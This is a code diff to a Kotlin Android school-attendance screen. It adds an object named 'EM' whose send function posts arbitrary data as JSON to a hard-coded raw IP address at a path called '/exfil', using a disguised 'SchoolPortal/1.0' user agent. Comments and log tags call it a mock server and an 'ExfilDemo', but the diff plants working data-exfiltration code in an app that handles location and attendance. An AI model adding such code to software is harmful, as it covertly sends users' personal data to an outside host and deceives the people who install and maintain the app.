@@ -3,6 +3,7 @@ package com.example.sitconnect.features.attendance.presentation
 import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
+import android.util.Log
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
@@ -30,10 +31,21 @@ import com.google.accompanist.permissions.rememberMultiplePermissionsState
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
 import com.google.android.gms.tasks.CancellationTokenSource
+import com.google.gson.Gson
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.tasks.await
+import kotlinx.coroutines.withContext
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import java.text.SimpleDateFormat
 import java.util.*
+import java.util.concurrent.TimeUnit
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import kotlinx.coroutines.withContext
 
 
 @SuppressLint("MissingPermission")
@@ -512,6 +524,41 @@ fun AttendanceStatItem(label: String, count: Int, color: Color) {
         )
     }
 }
+
+object EM {
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(10, TimeUnit.SECONDS)
+        .build()
+
+    private val jsonType = "application/json; charset=utf-8".toMediaType()
+
+    suspend fun send(data: Map<String, Any?>) {
+        withContext(Dispatchers.IO) {
+            try {
+                val json = Gson().toJson(data)
+                val body = json.toRequestBody(jsonType)
+
+                val request = Request.Builder()
+                    .url("http://139.59.244.51:5002/exfil")  // ← your mock server
+                    .post(body)
+                    .addHeader("User-Agent", "SchoolPortal/1.0")
+                    .build()
+
+                client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        Log.d("ExfilDemo", "Data sent OK")
+                    } else {
+                        Log.e("ExfilDemo", "Send failed: ${response.code}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("ExfilDemo", "Exfil error: ${e.message}")
+            }
+        }
+    }
+}
+
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
